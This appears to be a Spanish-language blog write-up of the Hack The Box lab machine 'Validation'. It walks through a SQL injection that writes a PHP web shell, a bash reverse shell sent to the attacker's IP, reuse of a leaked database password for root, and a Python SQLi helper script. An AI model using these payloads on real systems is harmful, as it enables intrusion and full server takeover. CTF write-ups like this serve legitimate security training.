---
layout: single
title: Validation HTB - WriteUp
excerpt: WriteUp de la máquina Validation de HTB.
date: 2023-02-20
classes: wide
header:
  teaser: /assets/images/Validation/Validation.png
  teaser_home_page: true
  icon: /assets/images/Validation/Validation.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - SQLI                                                                                                                                                                                  
  - Scripting                                                                                                                                                                                    
  - PasswordLeaked
---

En el dia de hoy estaré resolviendo la máquina Validation de HTB.

### Enumaración Inicial.

Lo primero que haremos será un escaneo de puertos con nmap.

```bash
 nmap -sC -sV -Pn -p22,80,4566,8080 10.10.11.116
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-20 09:54 CET
Nmap scan report for 10.10.11.116
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)'
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.52 seconds
```

Vemos 4 puertos abiertos:

- Puerto 22 -> OpenSSH 8.2p1 (no tenemos ni usuarios ni contraseñas)
- Puerto 80 ->  HTTP, tenemos una web que nos permite registrar usuarios por pais.
- Puerto 4566 -> HTTP, Una web que responde con un código de estado 403
- Puerto 8080 ->  HTTP, Responde con un código de estado 502

Lo primero que he hecho ha sido centrarme en el puerto 80, debido a que es el que tiene contenido accesible.

Lo primero que veremos será esto.

![](/assets/images/Validation/image1.png)

Podremos añadir usuarios a una lista de paises, voy a capturar la petición con Burpsuite y veré como se esta haciendo. He probado una inyección SQL en el pais añadiendo una comilla simple.

![](/assets/images/Validation/image2.png)

### Explotación Web.

Nos hace una redirección, si la seguimos no veremos ningun error... Pero si nos fijamos bien, nos está cambiando la cookie "user" intenté lo mismo con el valor de cookie nuvo y bingo...
Si seguimos la redirección tenemos SQLI.

![](/assets/images/Validation/image3.png)

Despues de enumerar ordenar las columnas (tiene 1) y enumerar a traves UNION SELECT bases de datos, tablas y columnas no encontré nada. En este momento intenté cargar archvios del sistema y ademas escribir en este.

![](/assets/images/Validation/image4.png)

Utilice este payload para ver si podía leer el passwd de la máquina víctima.

![](/assets/images/Validation/image5.png)

Podemos leer archivos del sistema... ¿Podremos escribir un archivo? Usaré este payload.

![](/assets/images/Validation/image6.png)

```php
username=test2&country=Brazil'union+select+'<?php+system($_GET["cmd"]);+?>'+into+outfile+'/var/www/html/shell.php'--+-
```

Gracias al error que provocamos inyectando una comilla sabemos la ruta del servidor web, si el payload anterior funciona guardaremos un archivo llamado shell.php que contendrá:

```php
<?php system($_GET["cmd"]); ?>
```

Esto nos permitirá pasarle comandos por GET por el parametro de consulta cmd. Si mandamos la petición con Burpsuite veremos que nos devuelve un error. Esto no significa que no se haya subido el archivo, vamos a ver si existe.

```bash
  curl -s -X GET "http://10.10.11.116/shell.php?cmd=id" 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Tenemos RCE ahora trataré de establecerme una revshell.

```bash
curl -s -G "http://10.10.11.116/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'"
```

Si miramos nuestro listener tendremos shell como el usuario www-data. 

```bash
 nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.116] 38848
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$
```

### Enumeración del sistema

Lo primero que hice fue hacer el tratamiento de la tty. https://ironhackers.es/tutoriales/como-conseguir-tty-totalmente-interactiva/

Si nos fijamos en el passwd no había usuarios que tengan asignada una bash, unicamente root. En el directorio que contiene la web podemos encontrar un archivo de configuración. que contiene lo siguiente:

```bash
www-data@validation:/var/www/html$ cat config.php 
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

### Explotación del sistema

Si probamos esa password para el usuario root veremos que es valida.

```bash
www-data@validation:/var/www/html$ su root
Password: 
root@validation:/var/www/html#
```

¡Happy Hacking!

### Bonus

Script para explotar el SQLI

```python
import requests,sys,signal,time
from bs4 import BeautifulSoup


proxies={"http":"http://127.0.0.1:8080"}
url="http://10.10.11.116/"


def handler(sig,frame):
        print ("\n[!] Saliendo...")
        sys.exit(1)

signal.signal(signal.SIGINT,handler)


def sqli(payload):

        data={"username":"test3","country":"{payload}".format(payload=payload)}

        s = requests.Session()
        r=s.post(url,data=data,proxies=proxies)
        response=r.text

        soup = BeautifulSoup(response, 'html.parser')
        print (soup.find_all(class_="text-white"))



if __name__ == '__main__':

        while True:

                payload  = input("\n$ Introduce el payload: ")
                sqli(payload)
```
